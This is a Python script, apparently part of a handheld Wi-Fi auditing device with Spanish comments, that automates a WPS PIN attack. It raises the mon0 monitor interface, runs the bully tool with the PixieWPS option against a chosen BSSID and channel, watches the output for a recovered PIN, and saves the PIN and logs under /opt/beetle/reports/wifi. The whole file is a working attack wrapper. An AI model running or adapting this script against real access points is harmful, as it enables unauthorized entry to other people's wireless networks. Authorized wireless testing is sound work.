#/opt/beetle/tools/wifi/bully_runner.py

import subprocess
import time
import os
import select
import signal
import sys
from display.screen import MenuDisplay

# --- Configuración ligera/constantes ---
IFACE = "mon0"
MON_UP_CMD = ["sudo", "mon0up"]
MON_DOWN_CMD = ["sudo", "mon0down"]

# --- Variables de control global para manejo de procesos y estado ---
_child_procs = []
_interrupted = False
_brought_up_by_script = False

# --- Utilidades ---
def run_cmd(cmd, stdout=None, stderr=None, text=True, check=False, timeout=None):
    return subprocess.run(cmd, stdout=stdout, stderr=stderr, text=text, check=check, timeout=timeout)

def check_command_exists(name):
    try:
        subprocess.run(["which", name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

def iface_is_up(iface=IFACE):
    try:
        res = subprocess.run(["ip", "-o", "link", "show", iface],
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if res.returncode != 0:
            return False
        out = res.stdout.lower()
        return ("state up" in out) or ("<up" in out)
    except Exception:
        return False

def _run_mon_cmd(cmd, timeout=4.0):
    """Ejecuta sudo mon0up/mon0down y devuelve (rc, stdout, stderr)."""
    try:
        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
        return p.returncode, (p.stdout or ""), (p.stderr or "")
    except Exception as e:
        return -1, "", str(e)

def bring_mon0_up(display=None):
    """Levanta mon0 usando `sudo mon0up`. Retorna True si quedó UP."""
    try:
        rc, out, err = _run_mon_cmd(MON_UP_CMD)
    except Exception:
        rc, out, err = -1, "", "exception"

    if rc != 0:
        combined = (out or "") + (err or "")
        if "Operation not supported" in combined or "operation not supported" in combined:
            pass

    for _ in range(10):
        if iface_is_up(IFACE) or os.path.isdir(f"/sys/class/net/{IFACE}"):
            return True
        time.sleep(0.4)
    return False

def bring_mon0_down(display=None):
    """Baja mon0 usando `sudo mon0down`. Sólo este método se usa para bajar el monitor."""
    if display:
        display.show_message([" Bajando mon0... "], center=True)
    try:
        rc, out, err = _run_mon_cmd(MON_DOWN_CMD)
    except Exception:
        rc, out, err = -1, "", "exception"

    combined = (out or "") + (err or "")
    if "device \"mon0\" does not exist" in combined.lower() or "no such device" in combined.lower():
        if display:
            display.show_message([" mon0 bajada "], center=True)
        return True

    time.sleep(0.5)
    if not iface_is_up(IFACE) and not os.path.isdir(f"/sys/class/net/{IFACE}"):
        if display:
            display.show_message([" mon0 bajada "], center=True)
        return True
    else:
        if display:
            display.show_message([" mon0 sigue UP "], center=True)
        return False

def _terminate_child_procs():
    """Termina procesos hijos abiertos de forma segura."""
    for p in list(_child_procs):
        try:
            if p.poll() is None:
                try:
                    p.terminate()
                    p.wait(timeout=2)
                except Exception:
                    try:
                        p.kill()
                    except Exception:
                        pass
        except Exception:
            pass
    _child_procs.clear()

def _signal_handler(signum, frame):
    """Manejo de SIGINT/SIGTERM -> intento terminar limpio y bajar mon0 con mon0down."""
    global _interrupted
    _interrupted = True
    try:
        _terminate_child_procs()
    except Exception:
        pass
    try:
        bring_mon0_down(display=None)
    except Exception:
        pass
    sys.exit(1)

# Registrar manejadores de señal
signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)

def run_bully(ssid, bssid, channel, use_pixie=True):
    """
    Ejecuta ataque WPS con Bully al BSSID dado en el canal especificado.
    Guarda logs en reports/wifi/. Si se encuentra el PIN, lo guarda en .pin.
    """
    global _brought_up_by_script, _interrupted
    display = MenuDisplay()
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    base_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "/opt/beetle/reports/wifi"))
    os.makedirs(base_path, exist_ok=True)
    log_path = os.path.join(base_path, f"bully_{ssid}_{timestamp}.log")
    pin_path = os.path.join(base_path, f"bully_{ssid}_{timestamp}.pin")

    display.show_message([f"BULLY:", f"{ssid}", "Iniciando..."], center=True)
    time.sleep(1)

    # Validar availability de comandos esenciales
    if not check_command_exists("bully"):
        display.show_message(["bully no encontrado", "Instalalo primero"], center=True)
        time.sleep(2)
        return None

    # Asegurar que mon0 esté UP
    was_up_before = iface_is_up(IFACE)
    if not was_up_before:
        ok = bring_mon0_up(display)
        if not ok:
            display.show_message(["No se pudo levantar", "mon0"], center=True)
            time.sleep(2)
            return None
        _brought_up_by_script = True

    # Comando base
    cmd = [
        "sudo", "bully",
        "mon0",
        "-b", bssid,
        "-c", str(channel),
        "-v3"
    ]

    # Activar PixieWPS si está habilitado
    if use_pixie:
        cmd.append("-d")

    try:
        with open(log_path, "w") as log_file:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            _child_procs.append(proc)
            poll = select.poll()
            poll.register(proc.stdout, select.POLLIN)

            pin_found = None

            while True:
                if _interrupted:
                    try:
                        proc.terminate()
                    except Exception:
                        pass
                    break

                if poll.poll(100):  # espera 100ms por datos nuevos
                    line = proc.stdout.readline()
                    if not line:
                        break

                    log_file.write(line)
                    log_file.flush()

                    lower_line = line.lower()

                    if "pin" in lower_line and "trying" in lower_line:
                        display.show_message([" Intentando PIN ", line.strip()[:16]])
                    elif "wps pin" in lower_line and "found" in lower_line:
                        pin_found = line.strip()
                        display.show_message([" PIN encontrado ", pin_found[:16]])
                        break
                    elif "rate limiting" in lower_line:
                        display.show_message([" AP bloqueado ", " esperando... "])
                    elif "bad fcs" in lower_line:
                        display.show_message([" Paquete FCS malo ", " saltando... "])
                    elif "waiting for beacon" in lower_line:
                        display.show_message([" Esperando beacon... "])
                    else:
                        display.show_message([line.strip()[:16]])
                else:
                    time.sleep(1)

            proc.terminate()
            proc.wait()

    except Exception as e:
        display.show_message(["Error:", str(e)[:16]])
    finally:
        _terminate_child_procs()
        if _brought_up_by_script:
            bring_mon0_down(display)

    if pin_found:
        with open(pin_path, "w") as f:
            f.write(pin_found + "\n")
        display.show_message([" PIN guardado ", pin_path[-20:]], center=True)
        time.sleep(10)
    else:
        display.show_message([" BULLY terminado ", " Sin PIN "], center=True)
        time.sleep(2)
